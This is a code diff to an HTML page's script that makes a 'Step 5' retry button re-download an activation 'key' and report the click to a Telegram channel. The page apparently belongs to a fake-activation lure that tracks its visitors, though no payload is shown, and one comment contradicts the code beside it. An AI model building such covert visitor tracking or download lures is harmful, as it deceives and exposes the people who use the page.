@@ -678,13 +678,16 @@ document.getElementById('downloadBtn').addEventListener('click', function() {
       }, 2000);
     });
 
-    // Step 5: Retry Button
-    document.getElementById('retryBtn').addEventListener('click', function() {
-      document.getElementById('step5').style.display = 'none';
-      document.getElementById('step3').style.display = 'block';
-      
-      sendTelegramMessage('🔄 RETRY ACTIVATION', 'User clicked Try Again');
-    });
+// Step 5: Retry Button
+document.getElementById('retryBtn').addEventListener('click', function() {
+    document.getElementById('step5').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
+    
+    // Download erneut starten (ohne Telegram-Notification)
+    startDownload();
+    
+    sendTelegramMessage('🔄 RETRY ACTIVATION', 'User clicked Try Again - redownloaded key');
+});
   </script>
 </body>
 </html>
